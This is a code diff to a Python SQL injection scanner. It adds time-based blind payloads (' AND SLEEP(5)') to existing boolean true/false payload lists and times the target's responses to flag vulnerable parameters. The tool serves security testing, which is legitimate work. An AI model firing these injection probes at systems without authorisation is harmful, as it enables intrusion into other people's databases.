@@ -1,10 +1,12 @@
 from url_utils import construct_test_url
 from response_analyzer import analyze_response
 import requests
+import time
 
 # SQL injection payloads for testing
 test_1_payloads = [" AND 1=1", "' AND '1'='1", '" AND "1"="1']
 test_2_payloads = [" AND 1=2", "' AND '1'='2", '" AND "1"="2']
+time_based_payloads = [" AND SLEEP(5)", "' AND SLEEP(5)%23", '" AND SLEEP(5)%23']
 
 
 # Function to send SQL payloads and receive the response
@@ -39,3 +41,18 @@ def test_sql_injection(target_url, id_value):
             print(f"Payload '{payload}' produced a similar response to true conditions (unexpected result).")
         else:
             analyze_response(default_response, response, payload)
+
+    # Test 3: Time-based blind conditions
+    print("\nTesting with Time-based conditions (Test 3):")
+    for payload in time_based_payloads:
+        new_url = construct_test_url(target_url, id_value, payload)
+        start_time = time.time()
+        send_payload(new_url)  # We don't need the response text, just the time taken
+        response_time = time.time() - start_time
+
+        # Check if response time indicates delay
+        if response_time > 4:  # Adjust threshold as needed, here set to 4 seconds
+            print(f"Payload '{payload}' caused a significant delay (likely vulnerable to time-based injection).")
+        else:
+            print(f"Payload '{payload}' did not cause a significant delay (likely not vulnerable to time-based "
+                  f"injection).")
